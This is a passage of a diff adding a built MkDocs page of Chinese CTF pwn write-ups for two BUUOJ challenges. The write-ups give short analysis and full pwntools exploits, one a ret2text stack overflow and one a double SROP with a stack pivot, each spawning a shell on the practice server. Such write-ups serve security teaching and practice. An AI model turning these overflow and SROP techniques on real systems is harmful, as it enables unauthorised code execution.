+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p><img alt="image-20250412045053702" src="image-20250412045053702.png" /></p>
+<h2 id="31_wustctf2020_getshell">题目31_wustctf2020_getshell</h2>
+<ul>
+<li>考点：<code>ret2text</code></li>
+<li>查看保护机制</li>
+</ul>
+<p><img alt="image-20250412045253728" src="image-20250412045253728.png" /></p>
+<ul>
+<li>直接逆向程序，这个函数存在栈溢出</li>
+</ul>
+<p><img alt="image-20250412045149701" src="image-20250412045149701.png" /></p>
+<ul>
+<li>并且还存在shell</li>
+</ul>
+<p><img alt="image-20250412045215879" src="image-20250412045215879.png" /></p>
+<ul>
+<li>exp如下：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+<span class="c1">#p = process(&#39;./wustctf2020_getshell&#39;)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.23.so&#39;</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">27172</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x1c</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x804851B</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p><img alt="image-20250412045443966" src="image-20250412045443966.png" /></p>
+<h2 id="32_ciscn_2019_s_3">题目32_ciscn_2019_s_3</h2>
+<ul>
+<li>考点：<code>ret2syscall</code>、<code>SROP</code>、<code>栈迁移</code></li>
+<li>查看保护机制，虽然是<code>32位</code>但是系统调用用的是<code>64</code>位的，并不是单纯的<code>32</code>位</li>
+</ul>
+<p><img alt="image-20250412045711162" src="image-20250412045711162.png" /></p>
+<ul>
+<li>直接逆向程序</li>
+</ul>
+<p><img alt="image-20250412045725895" src="image-20250412045725895.png" /></p>
+<ul>
+<li>还发现<code>gadget</code></li>
+</ul>
+<p><img alt="image-20250412045742149" src="image-20250412045742149.png" /></p>
+<ul>
+<li>这边直接调用俩次<code>SROP</code>，在第一次调用<code>SROP</code>的时候顺便进行栈迁移，第二次<code>getshell</code></li>
+<li>exp如下：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
+<span class="c1">#p = process(&#39;./ciscn_s_3&#39;)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.23.so&#39;</span><span class="p">)</span>
+<span class="c1">#gdb.attach(p)</span>
+<span class="c1">#pause()</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">26847</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;b&#39;</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4004DA</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400517</span><span class="p">)</span>
+<span class="n">sign</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
+<span class="n">sign</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">sign</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">sign</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mh">0x601030</span>
+<span class="n">sign</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mh">0x300</span>
+<span class="n">sign</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="mh">0x400517</span>
+<span class="n">sign</span><span class="o">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="mh">0x601030</span><span class="o">+</span><span class="mh">0x8</span>
+<span class="n">sign</span><span class="o">.</span><span class="n">rbp</span> <span class="o">=</span> <span class="mh">0x601030</span><span class="o">+</span><span class="mh">0x100</span>
+<span class="n">payload</span><span class="o">+=</span><span class="nb">bytes</span><span class="p">(</span><span class="n">sign</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4004DA</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400517</span><span class="p">)</span>
+<span class="n">sign2</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
+<span class="n">sign2</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="mi">59</span>
+<span class="n">sign2</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="mh">0x601030</span>
+<span class="n">sign2</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">sign2</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">sign2</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="mh">0x400517</span>
+<span class="n">payload</span><span class="o">+=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">sign2</span><span class="p">)</span>
+<span class="n">pause</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p><img alt="image-20250412094752586" src="image-20250412094752586.png" /></p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": [], "search": "../../../assets/javascripts/workers/search.f8cc74c7.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.c8b220af.min.js"></script>
+      
+    
+  </body>
+</html>
